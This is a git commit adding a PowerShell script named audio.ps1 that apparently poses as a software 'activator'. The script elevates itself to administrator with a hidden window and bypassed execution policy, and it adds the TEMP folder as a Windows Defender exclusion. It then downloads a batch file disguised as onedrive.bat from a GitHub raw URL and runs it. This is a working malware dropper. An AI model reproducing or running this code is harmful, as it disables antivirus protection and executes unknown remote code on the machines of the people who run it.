23db394ee500a63ace7c1e76925d5d96b8518c89
bgprofil9-create <bgprofil9@gmail.com>
2026-01-16 15:23:25 +0200

    Add files via upload

---
+++ audio.ps1
@@ -0,0 +1,32 @@
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $scriptContent = @'
+    $ErrorActionPreference = "SilentlyContinue"
+    Add-MpPreference -ExclusionPath $env:TEMP
+    $url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
+    $file = "$env:TEMP\onedrive.bat"
+    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
+    if (Test-Path $file) {
+        Start-Process $file
+    }
+'@
+    
+    $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
+    $scriptContent | Set-Content $tempFile -Encoding UTF8
+    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
+    exit
+}
+$ErrorActionPreference = "SilentlyContinue"
+
+Add-MpPreference -ExclusionPath $env:TEMP
+Start-Sleep 1
+$url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
+$file = "$env:TEMP\onedrive.bat"
+if (Test-Path $file) { Remove-Item $file -Force }
+Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
+Start-Sleep 2
+if (Test-Path $file) {
+    Start-Process $file
+    Write-Host "ACTIVATOR IS STARTED!" -ForegroundColor Green
+} else {
+    Write-Host "Файлът не е изтеглен" -ForegroundColor Red
+}
